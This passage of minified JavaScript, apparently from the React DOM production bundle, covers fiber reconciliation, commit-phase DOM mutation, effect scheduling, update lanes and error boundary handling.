e.flags&128?(e.lanes=n,e):(r=r!==null,r!==(t!==null&&t.memoizedState!==null)&&r&&(e.child.flags|=8192,e.mode&1&&(t===null||we.current&1?be===0&&(be=3):kd())),e.updateQueue!==null&&(e.flags|=4),Qe(e),null);case 4:return Ri(),sh(t,e),t===null&&Qs(e.stateNode.containerInfo),Qe(e),null;case 10:return dd(e.type._context),Qe(e),null;case 17:return mt(e.type)&&Ja(),Qe(e),null;case 19:if(ve(we),s=e.memoizedState,s===null)return Qe(e),null;if(r=(e.flags&128)!==0,o=s.rendering,o===null)if(r)ps(s,!1);else{if(be!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(o=sl(t),o!==null){for(e.flags|=128,ps(s,!1),r=o.updateQueue,r!==null&&(e.updateQueue=r,e.flags|=4),e.subtreeFlags=0,r=n,n=e.child;n!==null;)s=n,t=r,s.flags&=14680066,o=s.alternate,o===null?(s.childLanes=0,s.lanes=t,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=o.childLanes,s.lanes=o.lanes,s.child=o.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=o.memoizedProps,s.memoizedState=o.memoizedState,s.updateQueue=o.updateQueue,s.type=o.type,t=o.dependencies,s.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),n=n.sibling;return fe(we,we.current&1|2),e.child}t=t.sibling}s.tail!==null&&Re()>ki&&(e.flags|=128,r=!0,ps(s,!1),e.lanes=4194304)}else{if(!r)if(t=sl(o),t!==null){if(e.flags|=128,r=!0,n=t.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),ps(s,!0),s.tail===null&&s.tailMode==="hidden"&&!o.alternate&&!_e)return Qe(e),null}else 2*Re()-s.renderingStartTime>ki&&n!==1073741824&&(e.flags|=128,r=!0,ps(s,!1),e.lanes=4194304);s.isBackwards?(o.sibling=e.child,e.child=o):(n=s.last,n!==null?n.sibling=o:e.child=o,s.last=o)}return s.tail!==null?(e=s.tail,s.rendering=e,s.tail=e.sibling,s.renderingStartTime=Re(),e.sibling=null,n=we.current,fe(we,r?n&1|2:n&1),e):(Qe(e),null);case 22:case 23:return xd(),r=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==r&&(e.flags|=8192),r&&e.mode&1?vt&1073741824&&(Qe(e),e.subtreeFlags&6&&(e.flags|=8192)):Qe(e),null;case 24:return null;case 25:return null}throw Error(M(156,e.tag))}function MI(t,e){switch(ld(e),e.tag){case 1:return mt(e.type)&&Ja(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return Ri(),ve(pt),ve(et),yd(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return gd(e),null;case 13:if(ve(we),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error(M(340));Ai()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return ve(we),null;case 4:return Ri(),null;case 10:return dd(e.type._context),null;case 22:case 23:return xd(),null;case 24:return null;default:return null}}var fa=!1,Je=!1,FI=typeof WeakSet=="function"?WeakSet:Set,q=null;function ci(t,e){var n=t.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){Ae(t,e,r)}else n.current=null}function oh(t,e,n){try{n()}catch(r){Ae(t,e,r)}}var km=!1;function UI(t,e){if($c=Ka,t=lv(),od(t)){if("selectionStart"in t)var n={start:t.selectionStart,end:t.selectionEnd};else e:{n=(n=t.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var i=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{n.nodeType,s.nodeType}catch{n=null;break e}var o=0,l=-1,u=-1,h=0,f=0,p=t,g=null;t:for(;;){for(var v;p!==n||i!==0&&p.nodeType!==3||(l=o+i),p!==s||r!==0&&p.nodeType!==3||(u=o+r),p.nodeType===3&&(o+=p.nodeValue.length),(v=p.firstChild)!==null;)g=p,p=v;for(;;){if(p===t)break t;if(g===n&&++h===i&&(l=o),g===s&&++f===r&&(u=o),(v=p.nextSibling)!==null)break;p=g,g=p.parentNode}p=v}n=l===-1||u===-1?null:{start:l,end:u}}else n=null}n=n||{start:0,end:0}}else n=null;for(Wc={focusedElem:t,selectionRange:n},Ka=!1,q=e;q!==null;)if(e=q,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,q=t;else for(;q!==null;){e=q;try{var A=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(A!==null){var k=A.memoizedProps,N=A.memoizedState,S=e.stateNode,_=S.getSnapshotBeforeUpdate(e.elementType===e.type?k:Mt(e.type,k),N);S.__reactInternalSnapshotBeforeUpdate=_}break;case 3:var R=e.stateNode.containerInfo;R.nodeType===1?R.textContent="":R.nodeType===9&&R.documentElement&&R.removeChild(R.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(M(163))}}catch(V){Ae(e,e.return,V)}if(t=e.sibling,t!==null){t.return=e.return,q=t;break}q=e.return}return A=km,km=!1,A}function bs(t,e,n){var r=e.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&t)===t){var s=i.destroy;i.destroy=void 0,s!==void 0&&oh(e,n,s)}i=i.next}while(i!==r)}}function Ul(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var n=e=e.next;do{if((n.tag&t)===t){var r=n.create;n.destroy=r()}n=n.next}while(n!==e)}}function ah(t){var e=t.ref;if(e!==null){var n=t.stateNode;switch(t.tag){case 5:t=n;break;default:t=n}typeof e=="function"?e(t):e.current=t}}function i_(t){var e=t.alternate;e!==null&&(t.alternate=null,i_(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[Kt],delete e[Xs],delete e[Gc],delete e[EI],delete e[TI])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function s_(t){return t.tag===5||t.tag===3||t.tag===4}function Pm(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||s_(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function lh(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.nodeType===8?n.parentNode.insertBefore(t,e):n.insertBefore(t,e):(n.nodeType===8?(e=n.parentNode,e.insertBefore(t,n)):(e=n,e.appendChild(t)),n=n._reactRootContainer,n!=null||e.onclick!==null||(e.onclick=Xa));else if(r!==4&&(t=t.child,t!==null))for(lh(t,e,n),t=t.sibling;t!==null;)lh(t,e,n),t=t.sibling}function uh(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.insertBefore(t,e):n.appendChild(t);else if(r!==4&&(t=t.child,t!==null))for(uh(t,e,n),t=t.sibling;t!==null;)uh(t,e,n),t=t.sibling}var Fe=null,Ft=!1;function Dn(t,e,n){for(n=n.child;n!==null;)o_(t,e,n),n=n.sibling}function o_(t,e,n){if(Qt&&typeof Qt.onCommitFiberUnmount=="function")try{Qt.onCommitFiberUnmount(Nl,n)}catch{}switch(n.tag){case 5:Je||ci(n,e);case 6:var r=Fe,i=Ft;Fe=null,Dn(t,e,n),Fe=r,Ft=i,Fe!==null&&(Ft?(t=Fe,n=n.stateNode,t.nodeType===8?t.parentNode.removeChild(n):t.removeChild(n)):Fe.removeChild(n.stateNode));break;case 18:Fe!==null&&(Ft?(t=Fe,n=n.stateNode,t.nodeType===8?Xu(t.parentNode,n):t.nodeType===1&&Xu(t,n),Hs(t)):Xu(Fe,n.stateNode));break;case 4:r=Fe,i=Ft,Fe=n.stateNode.containerInfo,Ft=!0,Dn(t,e,n),Fe=r,Ft=i;break;case 0:case 11:case 14:case 15:if(!Je&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var s=i,o=s.destroy;s=s.tag,o!==void 0&&(s&2||s&4)&&oh(n,e,o),i=i.next}while(i!==r)}Dn(t,e,n);break;case 1:if(!Je&&(ci(n,e),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(l){Ae(n,e,l)}Dn(t,e,n);break;case 21:Dn(t,e,n);break;case 22:n.mode&1?(Je=(r=Je)||n.memoizedState!==null,Dn(t,e,n),Je=r):Dn(t,e,n);break;default:Dn(t,e,n)}}function Nm(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var n=t.stateNode;n===null&&(n=t.stateNode=new FI),e.forEach(function(r){var i=KI.bind(null,t,r);n.has(r)||(n.add(r),r.then(i,i))})}}function Lt(t,e){var n=e.deletions;if(n!==null)for(var r=0;r<n.length;r++){var i=n[r];try{var s=t,o=e,l=o;e:for(;l!==null;){switch(l.tag){case 5:Fe=l.stateNode,Ft=!1;break e;case 3:Fe=l.stateNode.containerInfo,Ft=!0;break e;case 4:Fe=l.stateNode.containerInfo,Ft=!0;break e}l=l.return}if(Fe===null)throw Error(M(160));o_(s,o,i),Fe=null,Ft=!1;var u=i.alternate;u!==null&&(u.return=null),i.return=null}catch(h){Ae(i,e,h)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)a_(e,t),e=e.sibling}function a_(t,e){var n=t.alternate,r=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(Lt(e,t),Ht(t),r&4){try{bs(3,t,t.return),Ul(3,t)}catch(k){Ae(t,t.return,k)}try{bs(5,t,t.return)}catch(k){Ae(t,t.return,k)}}break;case 1:Lt(e,t),Ht(t),r&512&&n!==null&&ci(n,n.return);break;case 5:if(Lt(e,t),Ht(t),r&512&&n!==null&&ci(n,n.return),t.flags&32){var i=t.stateNode;try{Bs(i,"")}catch(k){Ae(t,t.return,k)}}if(r&4&&(i=t.stateNode,i!=null)){var s=t.memoizedProps,o=n!==null?n.memoizedProps:s,l=t.type,u=t.updateQueue;if(t.updateQueue=null,u!==null)try{l==="input"&&s.type==="radio"&&s.name!=null&&ky(i,s),bc(l,o);var h=bc(l,s);for(o=0;o<u.length;o+=2){var f=u[o],p=u[o+1];f==="style"?Vy(i,p):f==="dangerouslySetInnerHTML"?Dy(i,p):f==="children"?Bs(i,p):Gh(i,f,p,h)}switch(l){case"input":xc(i,s);break;case"textarea":Py(i,s);break;case"select":var g=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!s.multiple;var v=s.value;v!=null?fi(i,!!s.multiple,v,!1):g!==!!s.multiple&&(s.defaultValue!=null?fi(i,!!s.multiple,s.defaultValue,!0):fi(i,!!s.multiple,s.multiple?[]:"",!1))}i[Xs]=s}catch(k){Ae(t,t.return,k)}}break;case 6:if(Lt(e,t),Ht(t),r&4){if(t.stateNode===null)throw Error(M(162));i=t.stateNode,s=t.memoizedProps;try{i.nodeValue=s}catch(k){Ae(t,t.return,k)}}break;case 3:if(Lt(e,t),Ht(t),r&4&&n!==null&&n.memoizedState.isDehydrated)try{Hs(e.containerInfo)}catch(k){Ae(t,t.return,k)}break;case 4:Lt(e,t),Ht(t);break;case 13:Lt(e,t),Ht(t),i=t.child,i.flags&8192&&(s=i.memoizedState!==null,i.stateNode.isHidden=s,!s||i.alternate!==null&&i.alternate.memoizedState!==null||(Cd=Re())),r&4&&Nm(t);break;case 22:if(f=n!==null&&n.memoizedState!==null,t.mode&1?(Je=(h=Je)||f,Lt(e,t),Je=h):Lt(e,t),Ht(t),r&8192){if(h=t.memoizedState!==null,(t.stateNode.isHidden=h)&&!f&&t.mode&1)for(q=t,f=t.child;f!==null;){for(p=q=f;q!==null;){switch(g=q,v=g.child,g.tag){case 0:case 11:case 14:case 15:bs(4,g,g.return);break;case 1:ci(g,g.return);var A=g.stateNode;if(typeof A.componentWillUnmount=="function"){r=g,n=g.return;try{e=r,A.props=e.memoizedProps,A.state=e.memoizedState,A.componentWillUnmount()}catch(k){Ae(r,n,k)}}break;case 5:ci(g,g.return);break;case 22:if(g.memoizedState!==null){bm(p);continue}}v!==null?(v.return=g,q=v):bm(p)}f=f.sibling}e:for(f=null,p=t;;){if(p.tag===5){if(f===null){f=p;try{i=p.stateNode,h?(s=i.style,typeof s.setProperty=="function"?s.setProperty("display","none","important"):s.display="none"):(l=p.stateNode,u=p.memoizedProps.style,o=u!=null&&u.hasOwnProperty("display")?u.display:null,l.style.display=by("display",o))}catch(k){Ae(t,t.return,k)}}}else if(p.tag===6){if(f===null)try{p.stateNode.nodeValue=h?"":p.memoizedProps}catch(k){Ae(t,t.return,k)}}else if((p.tag!==22&&p.tag!==23||p.memoizedState===null||p===t)&&p.child!==null){p.child.return=p,p=p.child;continue}if(p===t)break e;for(;p.sibling===null;){if(p.return===null||p.return===t)break e;f===p&&(f=null),p=p.return}f===p&&(f=null),p.sibling.return=p.return,p=p.sibling}}break;case 19:Lt(e,t),Ht(t),r&4&&Nm(t);break;case 21:break;default:Lt(e,t),Ht(t)}}function Ht(t){var e=t.flags;if(e&2){try{e:{for(var n=t.return;n!==null;){if(s_(n)){var r=n;break e}n=n.return}throw Error(M(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(Bs(i,""),r.flags&=-33);var s=Pm(t);uh(t,s,i);break;case 3:case 4:var o=r.stateNode.containerInfo,l=Pm(t);lh(t,l,o);break;default:throw Error(M(161))}}catch(u){Ae(t,t.return,u)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function jI(t,e,n){q=t,l_(t)}function l_(t,e,n){for(var r=(t.mode&1)!==0;q!==null;){var i=q,s=i.child;if(i.tag===22&&r){var o=i.memoizedState!==null||fa;if(!o){var l=i.alternate,u=l!==null&&l.memoizedState!==null||Je;l=fa;var h=Je;if(fa=o,(Je=u)&&!h)for(q=i;q!==null;)o=q,u=o.child,o.tag===22&&o.memoizedState!==null?Vm(i):u!==null?(u.return=o,q=u):Vm(i);for(;s!==null;)q=s,l_(s),s=s.sibling;q=i,fa=l,Je=h}Dm(t)}else i.subtreeFlags&8772&&s!==null?(s.return=i,q=s):Dm(t)}}function Dm(t){for(;q!==null;){var e=q;if(e.flags&8772){var n=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:Je||Ul(5,e);break;case 1:var r=e.stateNode;if(e.flags&4&&!Je)if(n===null)r.componentDidMount();else{var i=e.elementType===e.type?n.memoizedProps:Mt(e.type,n.memoizedProps);r.componentDidUpdate(i,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var s=e.updateQueue;s!==null&&gm(e,s,r);break;case 3:var o=e.updateQueue;if(o!==null){if(n=null,e.child!==null)switch(e.child.tag){case 5:n=e.child.stateNode;break;case 1:n=e.child.stateNode}gm(e,o,n)}break;case 5:var l=e.stateNode;if(n===null&&e.flags&4){n=l;var u=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":u.autoFocus&&n.focus();break;case"img":u.src&&(n.src=u.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var h=e.alternate;if(h!==null){var f=h.memoizedState;if(f!==null){var p=f.dehydrated;p!==null&&Hs(p)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(M(163))}Je||e.flags&512&&ah(e)}catch(g){Ae(e,e.return,g)}}if(e===t){q=null;break}if(n=e.sibling,n!==null){n.return=e.return,q=n;break}q=e.return}}function bm(t){for(;q!==null;){var e=q;if(e===t){q=null;break}var n=e.sibling;if(n!==null){n.return=e.return,q=n;break}q=e.return}}function Vm(t){for(;q!==null;){var e=q;try{switch(e.tag){case 0:case 11:case 15:var n=e.return;try{Ul(4,e)}catch(u){Ae(e,n,u)}break;case 1:var r=e.stateNode;if(typeof r.componentDidMount=="function"){var i=e.return;try{r.componentDidMount()}catch(u){Ae(e,i,u)}}var s=e.return;try{ah(e)}catch(u){Ae(e,s,u)}break;case 5:var o=e.return;try{ah(e)}catch(u){Ae(e,o,u)}}}catch(u){Ae(e,e.return,u)}if(e===t){q=null;break}var l=e.sibling;if(l!==null){l.return=e.return,q=l;break}q=e.return}}var zI=Math.ceil,ll=Rn.ReactCurrentDispatcher,Sd=Rn.ReactCurrentOwner,Pt=Rn.ReactCurrentBatchConfig,oe=0,Le=null,ke=null,ze=0,vt=0,hi=hr(0),be=0,ro=null,br=0,jl=0,Ad=0,Vs=null,ht=null,Cd=0,ki=1/0,un=null,ul=!1,ch=null,Jn=null,pa=!1,$n=null,cl=0,Os=0,hh=null,Na=-1,Da=0;function st(){return oe&6?Re():Na!==-1?Na:Na=Re()}function Zn(t){return t.mode&1?oe&2&&ze!==0?ze&-ze:SI.transition!==null?(Da===0&&(Da=Hy()),Da):(t=ue,t!==0||(t=window.event,t=t===void 0?16:Zy(t.type)),t):1}function Bt(t,e,n,r){if(50<Os)throw Os=0,hh=null,Error(M(185));go(t,n,r),(!(oe&2)||t!==Le)&&(t===Le&&(!(oe&2)&&(jl|=n),be===4&&Mn(t,ze)),gt(t,r),n===1&&oe===0&&!(e.mode&1)&&(ki=Re()+500,Ll&&dr()))}function gt(t,e){var n=t.callbackNode;ST(t,e);var r=Ga(t,t===Le?ze:0);if(r===0)n!==null&&$p(n),t.callbackNode=null,t.callbackPriority=0;else if(e=r&-r,t.callbackPriority!==e){if(n!=null&&$p(n),e===1)t.tag===0?II(Om.bind(null,t)):vv(Om.bind(null,t)),_I(function(){!(oe&6)&&dr()}),n=null;else{switch(Gy(r)){case 1:n=Jh;break;case 4:n=Wy;break;case 16:n=Ha;break;case 536870912:n=qy;break;default:n=Ha}n=g_(n,u_.bind(null,t))}t.callbackPriority=e,t.callbackNode=n}}function u_(t,e){if(Na=-1,Da=0,oe&6)throw Error(M(327));var n=t.callbackNode;if(vi()&&t.callbackNode!==n)return null;var r=Ga(t,t===Le?ze:0);if(r===0)return null;if(r&30||r&t.expiredLanes||e)e=hl(t,r);else{e=r;var i=oe;oe|=2;var s=h_();(Le!==t||ze!==e)&&(un=null,ki=Re()+500,Ar(t,e));do try{WI();break}catch(l){c_(t,l)}while(!0);hd(),ll.current=s,oe=i,ke!==null?e=0:(Le=null,ze=0,e=be)}if(e!==0){if(e===2&&(i=Fc(t),i!==0&&(r=i,e=dh(t,i))),e===1)throw n=ro,Ar(t,0),Mn(t,r),gt(t,Re()),n;if(e===6)Mn(t,r);else{if(i=t.current.alternate,!(r&30)&&!BI(i)&&(e=hl(t,r),e===2&&(s=Fc(t),s!==0&&(r=s,e=dh(t,s))),e===1))throw n=ro,Ar(t,0),Mn(t,r),gt(t,Re()),n;switch(t.finishedWork=i,t.finishedLanes=r,e){case 0:case 1:throw Error(M(345));case 2:_r(t,ht,un);break;case 3:if(Mn(t,r),(r&130023424)===r&&(e=Cd+500-Re(),10<e)){if(Ga(t,0)!==0)break;if(i=t.suspendedLanes,(i&r)!==r){st(),t.pingedLanes|=t.suspendedLanes&i;break}t.timeoutHandle=Hc(_r.bind(null,t,ht,un),e);break}_r(t,ht,un);break;case 4:if(Mn(t,r),(r&4194240)===r)break;for(e=t.eventTimes,i=-1;0<r;){var o=31-zt(r);s=1<<o,o=e[o],o>i&&(i=o),r&=~s}if(r=i,r=Re()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*zI(r/1960))-r,10<r){t.timeoutHandle=Hc(_r.bind(null,t,ht,un),r);break}_r(t,ht,un);break;case 5:_r(t,ht,un);break;default:throw Error(M(329))}}}return gt(t,Re()),t.callbackNode===n?u_.bind(null,t):null}function dh(t,e){var n=Vs;return t.current.memoizedState.isDehydrated&&(Ar(t,e).flags|=256),t=hl(t,e),t!==2&&(e=ht,ht=n,e!==null&&fh(e)),t}function fh(t){ht===null?ht=t:ht.push.apply(ht,t)}function BI(t){for(var e=t;;){if(e.flags&16384){var n=e.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var i=n[r],s=i.getSnapshot;i=i.value;try{if(!$t(s(),i))return!1}catch{return!1}}}if(n=e.child,e.subtreeFlags&16384&&n!==null)n.return=e,e=n;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function Mn(t,e){for(e&=~Ad,e&=~jl,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var n=31-zt(e),r=1<<n;t[n]=-1,e&=~r}}function Om(t){if(oe&6)throw Error(M(327));vi();var e=Ga(t,0);if(!(e&1))return gt(t,Re()),null;var n=hl(t,e);if(t.tag!==0&&n===2){var r=Fc(t);r!==0&&(e=r,n=dh(t,r))}if(n===1)throw n=ro,Ar(t,0),Mn(t,e),gt(t,Re()),n;if(n===6)throw Error(M(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,_r(t,ht,un),gt(t,Re()),null}function Rd(t,e){var n=oe;oe|=1;try{return t(e)}finally{oe=n,oe===0&&(ki=Re()+500,Ll&&dr())}}function Vr(t){$n!==null&&$n.tag===0&&!(oe&6)&&vi();var e=oe;oe|=1;var n=Pt.transition,r=ue;try{if(Pt.transition=null,ue=1,t)return t()}finally{ue=r,Pt.transition=n,oe=e,!(oe&6)&&dr()}}function xd(){vt=hi.current,ve(hi)}function Ar(t,e){t.finishedWork=null,t.finishedLanes=0;var n=t.timeoutHandle;if(n!==-1&&(t.timeoutHandle=-1,vI(n)),ke!==null)for(n=ke.return;n!==null;){var r=n;switch(ld(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&Ja();break;case 3:Ri(),ve(pt),ve(et),yd();break;case 5:gd(r);break;case 4:Ri();break;case 13:ve(we);break;case 19:ve(we);break;case 10:dd(r.type._context);break;case 22:case 23:xd()}n=n.return}if(Le=t,ke=t=er(t.current,null),ze=vt=e,be=0,ro=null,Ad=jl=br=0,ht=Vs=null,Tr!==null){for(e=0;e<Tr.length;e++)if(n=Tr[e],r=n.interleaved,r!==null){n.interleaved=null;var i=r.next,s=n.pending;if(s!==null){var o=s.next;s.next=i,r.next=o}n.pending=r}Tr=null}return t}function c_(t,e){do{var n=ke;try{if(hd(),xa.current=al,ol){for(var r=Ee.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}ol=!1}if(Dr=0,Oe=De=Ee=null,Ds=!1,eo=0,Sd.current=null,n===null||n.return===null){be=1,ro=e,ke=null;break}e:{var s=t,o=n.return,l=n,u=e;if(e=ze,l.flags|=32768,u!==null&&typeof u=="object"&&typeof u.then=="function"){var h=u,f=l,p=f.tag;if(!(f.mode&1)&&(p===0||p===11||p===15)){var g=f.alternate;g?(f.updateQueue=g.updateQueue,f.memoizedState=g.memoizedState,f.lanes=g.lanes):(f.updateQueue=null,f.memoizedState=null)}var v=Tm(o);if(v!==null){v.flags&=-257,Im(v,o,l,s,e),v.mode&1&&Em(s,h,e),e=v,u=h;var A=e.updateQueue;if(A===null){var k=new Set;k.add(u),e.updateQueue=k}else A.add(u);break e}else{if(!(e&1)){Em(s,h,e),kd();break e}u=Error(M(426))}}else if(_e&&l.mode&1){var N=Tm(o);if(N!==null){!(N.flags&65536)&&(N.flags|=256),Im(N,o,l,s,e),ud(xi(u,l));break e}}s=u=xi(u,l),be!==4&&(be=2),Vs===null?Vs=[s]:Vs.push(s),s=o;do{switch(s.tag){case 3:s.flags|=65536,e&=-e,s.lanes|=e;var S=Gv(s,u,e);mm(s,S);break e;case 1:l=u;var _=s.type,R=s.stateNode;if(!(s.flags&128)&&(typeof _.getDerivedStateFromError=="function"||R!==null&&typeof R.componentDidCatch=="function"&&(Jn===null||!Jn.has(R)))){s.flags|=65536,e&=-e,s.lanes|=e;var V=Kv(s,l,e);mm(s,V);break e}}s=s.return}while(s!==null)}f_(n)}catch(U){e=U,ke===n&&n!==null&&(ke=n=n.return);continue}break}while(!0)}function h_(){var t=ll.current;return ll.current=al,t===null?al:t}function kd(){(be===0||be===3||be===2)&&(be=4),Le===null||!(br&268435455)&&!(jl&268435455)||Mn(Le,ze)}function hl(t,e){var n=oe;oe|=2;var r=h_();(Le!==t||ze!==e)&&(un=null,Ar(t,e));do try{$I();break}catch(i){c_(t,i)}while(!0);if(hd(),oe=n,ll.current=r,ke!==null)throw Error(M(261));return Le=null,ze=0,be}function $I(){for(;ke!==null;)d_(ke)}function WI(){for(;ke!==null&&!mT();)d_(ke)}function d_(t){var e=m_(t.alternate,t,vt);t.memoizedProps=t.pendingProps,e===null?f_(t):ke=e,Sd.current=null}function f_(t){var e=t;do{var n=e.alternate;if(t=e.return,e.flags&32768){if(n=MI(n,e),n!==null){n.flags&=32767,ke=n;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{be=6,ke=null;return}}else if(n=LI(n,e,vt),n!==null){ke=n;return}if(e=e.sibling,e!==null){ke=e;return}ke=e=t}while(e!==null);be===0&&(be=5)}function _r(t,e,n){var r=ue,i=Pt.transition;try{Pt.transition=null,ue=1,qI(t,e,n,r)}finally{Pt.transition=i,ue=r}return null}function qI(t,e,n,r){do vi();while($n!==null);if(oe&6)throw Error(M(327));n=t.finishedWork;var i=t.finishedLanes;if(n===null)return null;if(t.finishedWork=null,t.finishedLanes=0,n===t.current)throw Error(M(177));t.callbackNode=null,t.callbackPriority=0;var s=n.lanes|n.childLanes;if(AT(t,s),t===Le&&(ke=Le=null,ze=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||pa||(pa=!0,g_(Ha,function(){return vi(),null})),s=(n.flags&15990)!==0,n.subtreeFlags&15990||s){s=Pt.transition,Pt.transition=null;var o=ue;ue=1;var l=oe;oe|=4,Sd.current=null,UI(t,n),a_(n,t),hI(Wc),Ka=!!$c,Wc=$c=null,t.current=n,jI(n),gT(),oe=l,ue=o,Pt.transition=s}else t.current=n;if(pa&&(pa=!1,$n=t,cl=i),s=t.pendingLanes,s===0&&(Jn=null),_T(n.stateNode),gt(t,Re()),e!==null)for(r=t.onRecoverableError,n=0;n<e.length;n++)i=e[n],r(i.value,{componentStack:i.stack,digest:i.digest});if(ul)throw ul=!1,t=ch,ch=null,t;return cl&1&&t.tag!==0&&vi(),s=t.pendingLanes,s&1?t===hh?Os++:(Os=0,hh=t):Os=0,dr(),null}function vi(){if($n!==null){var t=Gy(cl),e=Pt.transition,n=ue;try{if(Pt.transition=null,ue=16>t?16:t,$n===null)var r=!1;else{if(t=$n,$n=null,cl=0,oe&6)throw Error(M(331));var i=oe;for(oe|=4,q=t.current;q!==null;){var s=q,o=s.child;if(q.flags&16){var l=s.deletions;if(l!==null){for(var u=0;u<l.length;u++){var h=l[u];for(q=h;q!==null;){var f=q;switch(f.tag){case 0:case 11:case 15:bs(8,f,s)}var p=f.child;if(p!==null)p.return=f,q=p;else for(;q!==null;){f=q;var g=f.sibling,v=f.return;if(i_(f),f===h){q=null;break}if(g!==null){g.return=v,q=g;break}q=v}}}var A=s.alternate;if(A!==null){var k=A.child;if(k!==null){A.child=null;do{var N=k.sibling;k.sibling=null,k=N}while(k!==null)}}q=s}}if(s.subtreeFlags&2064&&o!==null)o.return=s,q=o;else e:for(;q!==null;){if(s=q,s.flags&2048)switch(s.tag){case 0:case 11:case 15:bs(9,s,s.return)}var S=s.sibling;if(S!==null){S.return=s.return,q=S;break e}q=s.return}}var _=t.current;for(q=_;q!==null;){o=q;var R=o.child;if(o.subtreeFlags&2064&&R!==null)R.return=o,q=R;else e:for(o=_;q!==null;){if(l=q,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:Ul(9,l)}}catch(U){Ae(l,l.return,U)}if(l===o){q=null;break e}var V=l.sibling;if(V!==null){V.return=l.return,q=V;break e}q=l.return}}if(oe=i,dr(),Qt&&typeof Qt.onPostCommitFiberRoot=="function")try{Qt.onPostCommitFiberRoot(Nl,t)}catch{}r=!0}return r}finally{ue=n,Pt.transition=e}}return!1}function Lm(t,e,n){e=xi(n,e),e=Gv(t,e,1),t=Xn(t,e,1),e=st(),t!==null&&(go(t,1,e),gt(t,e))}function Ae(t,e,n){if(t.tag===3)Lm(t,t,n);else for(;e!==null;){if(e.tag===3){Lm(e,t,n);break}else if(e.tag===1){var r=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(Jn===null||!Jn.has(r))){t=xi(n,t),t=Kv(e,t,1),e=Xn(e,t,1),t=st(),e!==null&&(go(e,1,t),gt(e,t));break}}e=e.return}}function HI(t,e,n){var r=t.pingCache;r!==null&&r.delete(e),e=st(),t.pingedLanes|=t.suspendedLanes&n,Le===t&&(ze&n)===n&&(be===4||be===3&&(ze&130023424)===ze&&500>Re()-Cd?Ar(t,0):Ad|=n),gt(t,e)}function p_(t,e){e===0&&(t.mode&1?(e=ia,ia<<=1,!(ia&130023424)&&(ia=4194304)):e=1);var n=st();t=wn(t,e),t!==null&&(go(t,e,n),gt(t,n))}function GI(t){var e=t.memoizedState,n=0;e!==null&&(n=e.retryLane),p_(t,n)}function KI(t,e){var n=0;switch(t.tag){case 13:var r=t.stateNode,i=t.memoizedState;i!==null&&(n=i.retryLane);break;case 19:r=t.stateNode;break;default:throw Error(M(314))}r!==null&&r.delete(e),p_(t,n)}var m_;m_=function(t,e,n){if(t!==null)if(t.memoizedProps!==e.pendingProps||pt.current)ft=!0;else{if(!(t.lanes&n)&&!(e.flags&128))return ft=!1,OI(t,e,n);ft=!!(t.flags&131072)}else ft=!1,_e&&e.flags&1048576&&_v(e,tl,e.index);switch(e.lanes=0,e.tag){case 2:var 